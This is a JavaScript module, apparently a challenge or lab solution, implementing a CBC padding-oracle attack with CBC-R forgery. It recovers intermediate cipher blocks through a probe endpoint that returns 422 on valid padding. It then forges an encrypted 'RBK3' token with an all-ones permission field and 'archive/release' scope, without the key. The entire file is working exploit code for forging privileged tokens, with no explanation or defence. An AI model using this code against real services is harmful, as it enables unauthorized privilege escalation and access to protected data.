// Operator-only CBC-R forgery using only serialized records and the probe API.
import { createHash, randomBytes } from 'node:crypto';

function crc(bytes) {
  let value = 0xffffffff;
  for (const byte of bytes) {
    value ^= byte;
    for (let bit = 0; bit < 8; bit++) value = value >>> 1 ^ (value & 1 ? 0xedb88320 : 0);
  }
  return (value ^ 0xffffffff) >>> 0;
}

export async function intermediateBlock(block, probe) {
  const result = Buffer.alloc(16), prefix = Buffer.alloc(16);
  for (let at = 15; at >= 0; at--) {
    const pad = 16 - at;
    for (let i = at + 1; i < 16; i++) prefix[i] = result[i] ^ pad;
    let recovered = false;
    for (let start = 0; start < 256 && !recovered; start += 64) {
      const candidates = Array.from({ length: 64 }, (_, i) => {
        const trial = Buffer.from(prefix); trial[at] = start + i;
        return Buffer.concat([trial, block]).toString('hex');
      });
      const results = await probe(candidates);
      if (!Array.isArray(results) || results.length !== candidates.length) throw Error('Invalid probe result');
      for (let i = 0; i < results.length; i++) {
        if (results[i] !== 422) continue;
        if (at > 0) {
          const confirm = Buffer.from(candidates[i], 'hex'); confirm[at - 1] ^= 1;
          if ((await probe([confirm.toString('hex')]))[0] !== 422) continue;
        }
        result[at] = (start + i) ^ pad; recovered = true; break;
      }
    }
    if (!recovered) throw Error('No valid padding at byte ' + at);
  }
  return result;
}

export async function forgePaddingToken(record, probe) {
  const clear = Buffer.alloc(80);
  clear.write('RBK3'); Buffer.from(record.nonce, 'hex').copy(clear, 4);
  clear.writeBigUInt64LE(BigInt(record.created), 20);
  clear.writeUInt32LE(0, 28); clear.writeUInt32LE(0xffffffff, 32);
  clear.write('archive/release', 36);
  createHash('sha256').update(record.nonce + '/padding').digest().copy(clear, 56, 0, 8);
  clear.writeUInt32LE(crc(Buffer.concat([clear.subarray(0, 52), clear.subarray(56, 64)])), 52);
  clear.fill(16, 64);
  const blocks = [randomBytes(16)];
  for (let at = clear.length - 16; at >= 0; at -= 16) {
    const intermediate = await intermediateBlock(blocks[0], probe);
    blocks.unshift(Buffer.from(intermediate.map((byte, i) => byte ^ clear[at + i])));
  }
  return Buffer.concat(blocks).toString('hex');
}
